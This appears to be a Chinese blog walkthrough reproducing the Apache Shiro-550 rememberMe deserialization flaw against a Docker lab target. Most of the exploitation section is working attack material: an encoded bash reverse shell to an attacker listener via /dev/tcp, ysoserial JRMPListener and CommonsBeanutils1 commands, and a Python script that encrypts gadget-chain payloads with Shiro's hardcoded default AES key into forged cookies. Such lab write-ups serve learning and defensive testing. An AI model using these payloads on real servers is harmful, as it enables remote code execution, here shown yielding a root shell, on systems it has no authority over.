最近一直在整理笔记，恰好碰到实习时遇到的Shiro反序列化漏洞，本着温故而知新的思想，就照着前辈们的文章好好研究了下，整理整理笔记并发个文章。新人初次投稿，文章有啥问题的话，还望各位大佬多多包含。

## 1、Apache Shiro介绍

> Apache
> Shiro是一个强大且易用的Java安全框架，执行身份验证、授权、密码和会话管理。使用Shiro易于理解的API，开发者可以快速、轻松地获得任何应用程序，从最小的移动应用程序到最大的网络和企业应用程序。

![](https://image.3001.net/images/20211008/1633705094_61605c86eab89276ade67.png!small)

## 2、Shiro rememberMe反序列化漏洞（Shiro-550）

### 2.1 受影响版本

Apache Shiro <=1.2.4

### 2.2 特征判断

返回包中含有rememberMe=deleteMe字段

### 2.3 漏洞原理

在Shiro <=
1.2.4中，反序列化过程中所用到的AES加密的key是硬编码在源码中，当用户勾选RememberMe并登录成功，Shiro会将用户的cookie值序列化，AES加密，接着base64编码后存储在cookie的rememberMe字段中，服务端收到登录请求后，会对rememberMe的cookie值进行base64解码，接着进行AES解密，然后反序列化。由于AES加密是对称式加密（key既能加密数据也能解密数据），所以当攻击者知道了AES
key后，就能够构造恶意的rememberMe cookie值从而触发反序列化漏洞。

## 3、漏洞复现

### 3.1 环境搭建

> //获取docker镜像
>
> docker pull medicean/vulapps:s_shiro_1
>
> //启动容器
>
> docker run -d -p 8080:8080 medicean/vulapps:s_shiro_1

###
![](https://image.3001.net/images/20211008/1633705529_61605e39121e8ebf607a6.png!small)3.2
工具准备

3.2.1 配置maven

1、下载maven

<http://maven.apache.org/download.cgi>

2、配置win10 maven环境变量以及idea maven环境

<https://zhuanlan.zhihu.com/p/48831465>

3.2.2 下载ysoserial工具并打包

下载地址：https://github.com/frohoff/ysoserial

打包完的ysoserial在ysoserial/target文件中

> git clone <https://github.com/frohoff/ysoserial.git>
>
> cd ysoserial
>
> mvn package -D skipTests

![](https://image.3001.net/images/20211008/1633705691_61605edbb8842e2cc757d.png!small)![](https://image.3001.net/images/20211008/1633705706_61605eead596dbd812dc4.png!small)PS：终于打包完了，没想到Maven源换成了阿里云的速度还是有点慢。

### 3.3 漏洞检测

这里使用shiro_tool.jar工具检测Shiro是否存在默认的key，

java -jar shiro_tool.jar
[http://192.168.31.81:8080/](http://192.168.31.81:8080/)

###
![](https://image.3001.net/images/20211008/1633705901_61605fad8a5a35b6064d5.png!small)3.4
漏洞利用

### 3.4.1 方式一：nc反弹shell

1、制作反弹shell代码

首先，在kali中通过nc监听本地端口，

nc -lvp 4444

接着利用Java Runtime配合bash编码，

bash -i >& /dev/tcp/192.168.31.81/4444 0>&1

结果：bash -c
{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMxLjgxLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}

2、通过ysoserial工具中的JRMP监听模块，监听6666端口并执行反弹shell命令，

java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666
CommonsCollections4 'bash -c
{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMxLjgxLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}'

3、利用检测出的AES密钥，生成payload

> import sys
>
> import uuid
>
> import base64
>
> import subprocess
>
> from Crypto.Cipher import AES
>
> def encode_rememberme(command):
>
> popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-> all.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
>
> BS = AES.block_size
>
> pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
>
> key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
>
> iv = uuid.uuid4().bytes
>
> encryptor = AES.new(key, AES.MODE_CBC, iv)
>
> file_body = pad(popen.stdout.read())
>
> base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
>
> return base64_ciphertext
>
>  
>
>
> if __name__ == '__main__':
>
> payload = encode_rememberme(sys.argv[1])
>
> print "rememberMe={0}".format(payload.decode())

Python2用pip安装Crypto的过程中，出现了各种问题，最主要的问题就是各种报缺少Crypto.Cipher模块的错误，Google百度网上找了一大堆，疯狂pip安装卸载，都无法解决，后来索性采取了手动安装Crypto模块，最后终于解决。

> 问题一：ImportError: No module named Crypto.Cipher
>
> ——>手动下载Crypto包进行安装
>
> 下载地址：https://pypi.org/simple/pycrypto/
>
> 问题二：error: command ‘x86_64-linux-gnu-gcc‘ failed with exit status 1
>
> ——>安装依赖库解决：
>
> apt-get install build-essential python-dev libssl-dev libffi-dev libxml2
> libxml2-dev libxslt1-dev zlib1g-dev

使用test_shiro550.py，生成payload

> python test_shiro550.py 192.168.31.81:6666

![](https://image.3001.net/images/20211008/1633706986_616063eae90b8bfc12aa1.png!small)

4、利用生成的rememberMe值构造数据包，伪造cookie，发送请求。

![](https://image.3001.net/images/20211008/1633707029_616064151db6e2fa09ac5.png!small)

5、查看nc监听结果，反弹shell成功。

![](https://image.3001.net/images/20211008/1633707070_6160643e0bfbd7253e488.png!small)nc成功反弹shell，whoami命令查询为root权限。

### 3.4.2 方式二：命令执行

1、使用ysoserial工具生成poc

java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 "echo 'test
shiro-550' > /tmp/SUCCESS" > poc

2、使用Shiro默认AES Key对payload进行加密

![](https://image.3001.net/images/20211008/1633707260_616064fc4ec58bb8d0570.png!small)

3、brupsuite抓包，发送带有伪造的rememberMe Cookie的请求。

![](https://image.3001.net/images/20211008/1633707313_61606531384e41b1ec300.png!small)

4、查看目标服务器的/tmp目录，确认生成了SUCCESS文件。

![](https://image.3001.net/images/20211008/1633707344_61606550b477e0f6a597e.png!small)

## 5、总结

Shiro-550漏洞产生的根本原因就是因为AES加密的key硬编码在源码中，从而可以被攻击者利用泄露的AES
key伪造rememberMe字段生成cookie值，导致反序列化漏洞。因此，服务器端对cookie值的处理过程反过来就是payload的产生过程：命令=>进行序列化=>AES加密=>base64编码=>产生RememberMe
Cookie值。

